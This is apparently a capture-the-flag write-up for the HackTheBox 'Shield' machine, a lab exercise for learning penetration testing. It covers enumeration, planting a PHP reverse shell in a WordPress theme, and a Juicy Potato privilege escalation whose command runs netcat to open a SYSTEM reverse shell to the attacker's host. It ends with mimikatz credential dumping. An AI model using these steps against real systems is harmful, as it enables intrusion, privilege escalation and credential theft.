---
description: Shield box from HackTheBox write up.
---

# Shield

## nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 12:39 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -p80,3306 -sC -sV 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 12:41 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.33s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```

The scan shows a MySQL server and a web server (I also run a scan of all the ports but looks like not more ports open). Look's like MySQL server is only accesible from `localhost` so let's start checking the web server. 

## Port 80

The web server shows the default ISS page. `gobuster` time I guess, since is a Windows box we can use the lowercase wordlist because NTFS is case insensitive:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<MACHINE_IP>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/02 12:51:38 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 152] [--> http://<MACHINE_IP>/wordpress/]
===============================================================
2021/09/02 12:53:13 Finished
===============================================================
```

Cool, a Wordpress site time for enumeration. Checking the blog page I found that `admin` is a valid user so we have something for a brute force attack if necessary.

Before attempting a brute force attack (`xmlrpc` is enabled so we can try to do it) i tried some previous challenges passwords and `P@s5w0rd!` worked!

Once in the Wordpress admin panel getting a reverse shell is trivial editing the theme templates. I edited the `404.php` template of the `twentynineteen` theme. I added a Windows PHP reverse shell to it and after setting up a listener y executed the shell in `/wp-content/themes/twentynineteen/404.php`.

## In the box

Once in the box the first thing we can grab are the database credentials and get access to it if we wish to. The credentials are found in the Wordpress `wp-config.php` file:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress124');

/** MySQL database username */
define('DB_USER', 'wordpressuser124');

/** MySQL database password */
define('DB_PASSWORD', 'P_-U9dA6q.B|');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

The thing is that there is something better. Using the `systeminfo` command we see that the server is using `Microsoft Windows Server 2016 Standard` which is vulnerable to Rotten Potato. In this case we will use Juicy Potato that is basically an improve Rotten Potato. After uploading the exploit binary we will also need a `netcat` binary to get a reverse shell with `system` privileges. Once we have all in the box we can prepare a listener and launch the exploit:

```powershell
PS C:\inetpub\wwwroot\wordpress\wp-content\uploads> .\jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e cmd.exe <MY_IP> 9000" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Shield/www]
└─$ nc -lnvp 9000                                             
listening on [any] 9000 ...
connect to [<MY_IP>] from (UNKNOWN) [<MACHINE_IP>] 50123
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Boom! The `root` flag is in  `C:\Users\Administrator\Desktop\root.txt`

## Post exploitation

Once we are `system` we can try to get some credentials from the users in the system. Uploading a `mimikatz` binary we can get `sandra:Password1234!`credentials using the `sekurlsa::logonpasswords` functionality.